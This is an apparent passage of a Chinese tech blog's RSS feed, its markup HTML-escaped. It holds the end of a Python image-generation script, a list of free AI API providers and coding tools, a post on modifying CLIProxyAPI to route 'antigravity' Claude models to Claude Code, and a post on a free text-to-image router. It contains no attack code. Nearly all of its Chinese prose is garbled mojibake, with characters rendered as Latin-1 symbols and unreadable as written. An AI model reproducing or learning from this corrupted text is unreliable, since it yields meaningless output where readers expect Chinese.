&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--input-image&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;-i&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;None&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    parser.add_argument&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--select&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;all&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;choices&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;all&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;first&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;last&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;max_res&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;args&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; parser.parse_args&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; not args.prompt:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        parser.print_help&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        sys.exit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;prompt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;args.prompt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; args.mode &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sdk&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;saved&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; _sdk_generate&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;prompt,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;output_dir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.output_dir,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;aspect_ratio&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.aspect_ratio,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;resolution&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.resolution,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;input_image&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.input_image,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;output_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.output_name,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;mkdir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.mkdir,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.select,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;saved&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; _http_generate&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;prompt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;prompt,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;output_dir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.output_dir,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;aspect_ratio&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.aspect_ratio,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;resolution&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.resolution,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;input_image&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.input_image,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.select,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;output_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.output_name,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nv&#34;&gt;mkdir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;args.mkdir,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; saved:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;Generated {len(saved)} image(s):&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; f in saved:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;s2&#34;&gt;&amp;#34;  - {Path(f).resolve()}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;No images were generated.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        sys.exit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    main&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŸºæœ¬ç”¨æ³•ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>æ•´ç†ä¸‹AIå¤§æ¨¡å‹å‚å•†å’Œå¹³å°ï¼Œèƒ½é•¿æœŸç¨³å®šæä¾›å…è´¹é¢åº¦çš„API (éå…¬ç›Šç«™) - è½¬è‡ªLinux.do</title>
      <link>https://rendoumi.com/posts/20251231-ai_models/</link>
      <pubDate>Wed, 31 Dec 2025 09:30:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251231-ai_models/</guid>
      <description>&lt;p&gt;ç°åœ¨AIçš„ä½¿ç”¨åœºæ™¯è¶Šæ¥è¶Šå¤šï¼Œå…¬ç›Šç«™æœ‰æ—¶ä¹Ÿä¸ç¨³å®šï¼Œç»™å¤§å®¶æ•´ç†ä¸€äº›èƒ½æä¾›ç›¸å¯¹é•¿æœŸç¨³å®šå¤§æ¨¡å‹apiçš„å‚å•†å’Œå¹³å°ï¼Œä½œä¸ºå¤‡ç”¨æˆ–æµ‹è¯•ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œä¸»è¦æ”¶é›†æ–‡æœ¬å¤§æ¨¡å‹ï¼Œå›¾ç‰‡è§†é¢‘ç”Ÿæˆç›¸å…³çš„å¤§æ¨¡å‹æ²¡æœ‰ä¸“é—¨åšæ•´ç†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;tldr&#34;&gt;&lt;strong&gt;tldr&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;å›½å†…å¤§æ¨¡å‹å¹³å°å¤ªå·äº†ï¼Œå…è´¹é¢åº¦çœŸçš„å¾ˆå¤šï¼Œå¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œå›½å†…çš„apiå°±å¤Ÿç”¨äº†ã€‚&lt;/li&gt;
&lt;li&gt;ä¸»åŠ›æ¨¡å‹æ¨è: é˜¿é‡Œiflow, å­—èŠ‚ç«å±±å¼•æ“, é˜¿é‡Œ modelscope é­”æ­ç¤¾åŒºã€‚&lt;/li&gt;
&lt;li&gt;å…è´¹vibe codingæ¨è: è…¾è®¯codebuddy,  å¿«æ‰‹codeflicker, é˜¿é‡Œé€šä¹‰çµç /qwen-code&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;éç¨³å®šæ¸ é“&#34;&gt;éç¨³å®šæ¸ é“&lt;/h2&gt;
&lt;p&gt;ä¸€äº›å¹³å°ä¼šä¸å®šæœŸæ¨å‡ºå¸å¼•ç”¨æˆ·çš„å…è´¹æ´»åŠ¨ï¼Œé€‚åˆç”¨æ¥æµ‹è¯•å’Œä¸´æ—¶åº”æ€¥ã€‚ä¸‹é¢åˆ—å‡ºä¸€äº›ï¼Œè¿‡æœŸäº†çš„å°±è¯„è®ºä¸‹æé†’æˆ‘åˆ æ‰ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AI Ping
&lt;ul&gt;
&lt;li&gt;20251226 é™æ—¶å…è´¹: &lt;strong&gt;glm-4.7&lt;/strong&gt;, &lt;strong&gt;minimax-m2.1&lt;/strong&gt;, deepseek-v3.2, douban-seeddreamæ–‡ç”Ÿå›¾&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;æ¨¡å‹é™åˆ¶ç›¸å…³è¯´æ˜&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;rpm(Requests per minute): æ¯åˆ†é’Ÿè¯·æ±‚æ¬¡æ•°&lt;/li&gt;
&lt;li&gt;rpd(Requests per day): æ¯å¤©è¯·æ±‚æ¬¡æ•°&lt;/li&gt;
&lt;li&gt;tpm(Tokens per minute): æ¯åˆ†é’Ÿè¾“å…¥è¾“å‡ºçš„tokenæ•°&lt;/li&gt;
&lt;li&gt;tpd(Tokens per day): æ¯å¤©è¾“å…¥è¾“å‡ºçš„tokenæ•°&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;vibe-coding-å…è´¹ä»£ç å·¥å…·&#34;&gt;Vibe Coding å…è´¹ä»£ç å·¥å…·&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;å›½å†…çš„ ai coding å¤ªå·äº†ï¼Œå„å®¶éƒ½æä¾›äº†å¾ˆå¤§çš„å…è´¹é¢åº¦&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;è…¾è®¯äº‘ä»£ç åŠ©æ‰‹-codebuddy-ç‹¬ç«‹ide&#34;&gt;&lt;a href=&#34;https://copilot.tencent.com/ide/&#34;&gt;è…¾è®¯äº‘ä»£ç åŠ©æ‰‹ CodeBuddy&lt;/a&gt;, ç‹¬ç«‹IDE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ç›®å‰(20251222)å…è´¹ä½¿ç”¨ glm-4.6, deepseek-v3.1-terminus, huyuan-2.0
&lt;ul&gt;
&lt;li&gt;20251223: å…è´¹æä¾›æœ€æ–°çš„ &lt;strong&gt;glm-4.7&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;å¿«æ‰‹-codeflicker--ç‹¬ç«‹ide&#34;&gt;å¿«æ‰‹ &lt;a href=&#34;https://www.codeflicker.ai/&#34;&gt;CodeFlicker &lt;/a&gt;, ç‹¬ç«‹IDE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ç›®å‰(20251222)å…è´¹ä½¿ç”¨ kimi-k2-0905, kat-coder-pro&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;é˜¿é‡Œ-é€šä¹‰çµç --ç‹¬ç«‹ide&#34;&gt;é˜¿é‡Œ &lt;a href=&#34;https://lingma.aliyun.com/&#34;&gt;é€šä¹‰çµç  &lt;/a&gt;, ç‹¬ç«‹IDE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;å…è´¹ä¸é™é‡ä½¿ç”¨ åƒé—®ç³»åˆ—æ¨¡å‹ï¼Œä½†ä¸å¯æ›´æ¢ä½¿ç”¨å…¶ä»–æ¨¡å‹&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;é˜¿é‡Œ-qwen-code-cliå‘½ä»¤è¡Œ&#34;&gt;é˜¿é‡Œ &lt;a href=&#34;https://github.com/QwenLM/qwen-code&#34;&gt;qwen-code&lt;/a&gt;, cliå‘½ä»¤è¡Œ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;free tier&lt;/p&gt;</description>
    </item>
    <item>
      <title>CLIProxyAPIåä»£antigravityå•ç‹¬èµ°ä»£ç†</title>
      <link>https://rendoumi.com/posts/20251230-cliproxyapi_antigravity/</link>
      <pubDate>Tue, 30 Dec 2025 09:30:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251230-cliproxyapi_antigravity/</guid>
      <description>&lt;p&gt;ç”¨CLIProxyAPIåä»£äº†antigravityï¼ŒæŠ½å‡ºäº†claudeçš„æ¨¡å‹ç»™claude  codeç”¨&lt;/p&gt;
&lt;p&gt;åŒæ—¶ä¹Ÿæ¥å…¥äº†qwen3-code-plusæ¨¡å‹&lt;/p&gt;
&lt;p&gt;è¿˜æ¥å…¥äº†openrouterçš„æ¨¡å‹&lt;/p&gt;
&lt;p&gt;åæœŸè¿˜å‡†å¤‡æ¥å…¥minmaxç­‰æ¨¡å‹&lt;/p&gt;
&lt;p&gt;è¿™æ ·å°±å‡ºç°ä¸ªé—®é¢˜ï¼šè®¿é—® antigravity éœ€è¦ä»£ç†ï¼Œè€Œè®¿é—®qwenå’Œopenrouteræˆ–è€…å…¶å®ƒå¯èƒ½å¹¶ä¸éœ€è¦&lt;/p&gt;
&lt;p&gt;å¦‚æœè®¾ç½®äº†å…¨å±€ä»£ç†ï¼Œé‚£è®¿é—®å…¶å®ƒ2ä¸ªè®¿é—®å°±ç»•è·¯äº†&lt;/p&gt;
&lt;p&gt;æœ¬æ¥æƒ³æä¸ªPRçš„ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸æ˜¯ä»€ä¹ˆå¤§éœ€æ±‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥å¹²è„†ç”¨claudeæ”¹äº†ä¸€ä¸‹ï¼Œé…ç½®æ–‡ä»¶config.yamlä¸­æ–°å¢äº†ä¸€ä¸ªé…ç½®é¡¹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;antigravity_proxy: &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·æ–¹ä¾¿äº†å°±&lt;/p&gt;
&lt;p&gt;ä»£ç æ”¾åœ¨ï¼š&lt;a href=&#34;https://www.github.com/zhangrr/CLIProxyAPI&#34;&gt;GitHub - zhangrr/CLIProxyAPI: modify CLIProxyAPI&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;claude code çš„ settings.json é…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  â€œenvâ€: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    â€œANTHROPIC_BASE_URLâ€: â€œhttp://10.8.2.25:8317â€,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    â€œANTHROPIC_AUTH_TOKENâ€: â€œsk-xxxxxxxâ€,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    â€œANTHROPIC_DEFAULT_HAIKU_MODELâ€: â€œqwen3-coder-plusâ€,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    â€œANTHROPIC_DEFAULT_OPUS_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    â€œANTHROPIC_DEFAULT_SONNET_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    â€œANTHROPIC_MODELâ€: â€œgemini-claude-sonnet-4-5-thinkingâ€
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯·è‡ªè¡Œå–ç”¨&lt;/p&gt;</description>
    </item>
    <item>
      <title>é­”æ­ã€æ¨¡åŠ›æ–¹èˆŸã€è±†åŒ…å…è´¹æ–‡ç”Ÿå›¾</title>
      <link>https://rendoumi.com/posts/20251230-img_router/</link>
      <pubDate>Tue, 30 Dec 2025 09:20:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251230-img_router/</guid>
      <description>&lt;p&gt;åœ¨åˆ«äººçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ‰‹æ“äº†ä¸€ä¸ªåˆ©ç”¨ä¸‰ä¸ªæ¨¡å‹æä¾›å•†çš„å…è´¹æ¨¡å‹é¢åº¦ï¼Œæ¥æ–‡ç”Ÿå›¾çš„ç¨‹åº&lt;/p&gt;
&lt;p&gt;åŸåœ°å€ï¼šhttps://github.com/lianwusuoai/img-router ï¼Œ[æ™ºèƒ½å›¾åƒç”Ÿæˆç½‘å…³ï¼Œé€šè¿‡OpenAI å…¼å®¹æ¥å£ï¼Œä½¿ç”¨chatè‡ªåŠ¨è·¯ç”±å¤šå¹³å° AI è¿›è¡Œå…è´¹ç»˜å›¾]&lt;/p&gt;
&lt;p&gt;é­”æ”¹çš„åœ°å€ï¼šhttp://github.com/zhangrr/image-route&lt;/p&gt;
&lt;p&gt;äº®ç‚¹ï¼šå…è´¹APIäººäººéƒ½æœ‰ï¼Œä¸éœ€è¦ä¸“é—¨ç»˜å›¾ç½‘ç«™ï¼Œä¸éœ€è¦è€ƒè™‘å„ç§æ¥å£ï¼Œä¸éœ€è¦çƒ¦æ¼Cherry Studio/RikkaHub/newapiç­‰å®¢æˆ·ç«¯orå¹³å°ä¸å…¼å®¹/ä¸æ”¯æŒï¼Œè®©æ–‡ç”Ÿå›¾/å›¾ç”Ÿå›¾/å›¾ç‰‡ç¼–è¾‘ï¼Œå°±åƒå’ŒaièŠå¤©chatä¸€æ ·æ–¹ä¾¿ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ai.gitee.com/ondobtug/dashboard/settings/tokens&#34;&gt;æ¨¡åŠ›æ–¹èˆŸ&lt;/a&gt;å…è´¹keyæ¯å¤©100æ¬¡ æ— å®¡æ ¸ï¼Œä¸è¦ç™½å¤©éšä¾¿ç”Ÿå›¾ï¼Œæ¶©æ¶©è­¦å‘Š!&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.modelscope.cn/my/myaccesstoken&#34;&gt;é­”æ­&lt;/a&gt;å…è´¹keyæ¯å¤©2000æ¬¡ å•æ¨¡å‹500æ¬¡ ä¸å¯æ¶©æ¶©ï¼&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://console.volcengine.com/ark/region:ark+cn-beijing/openManagement/rewardPlan&#34;&gt;è±†åŒ…4.0+4.5&lt;/a&gt;æ¯ä¸ªæ¨¡å‹200æ¬¡ï¼Œæ¯å¤©æœ€å¤šæ¢å¤20æ¬¡ï¼Œå¯ä»¥è®¾ç½®ä¸Šé™é˜²è¶…å‡º ä¸å¯æ¶©æ¶©ï¼&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é‚£åŸç‰ˆæ˜¯åªèƒ½é€šè¿‡APIè¿›è¡Œè®¿é—®ï¼Œæ­£å¥½æœ‰claude codeçš„é¢åº¦ï¼Œé‚£å°±å¹²è„†å¥—ä¸ªwebçš„ç•Œé¢å‡ºæ¥&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;é­”åŠ›æ–¹èˆŸæ³¨å†Œåï¼Œç”Ÿæˆapiçš„keyå³å¯&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é­”æ­æ˜¯é˜¿é‡Œçš„ï¼Œç”Ÿæˆapiçš„keyåï¼Œéœ€è¦ç»è¿‡é˜¿é‡Œçš„è´¦å·éªŒè¯ï¼Œæ‰èƒ½ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;ä¸è¦éƒ¨ç½²ä»»ä½•æ¨¡å‹ï¼Œé˜¿é‡Œçš„è´¦å·æœ€å¥½é‡Œé¢æ²¡æœ‰ç»‘å¡ï¼Œæ²¡æœ‰é’±&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251230154834644&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251230-img_router/image-20251230154834644.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è±†åŒ…æ˜¯ç«å±±å¼•æ“ï¼Œå¼€é€šè´¦å·ç”Ÿæˆapiçš„keyåï¼Œéœ€è¦å®äººè®¤è¯ï¼Œç„¶åè¿˜éœ€è¦éƒ¨ç½²æ¨¡å‹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251230155104015&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251230-img_router/image-20251230155104015.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251230155021461&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251230-img_router/image-20251230155021461.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251230155045439&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251230-img_router/image-20251230155045439.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ‹¿åˆ°3ä¸ªå…è´¹çš„APIåï¼Œå…‹éš†æºä»£ç ï¼š&lt;/p&gt;
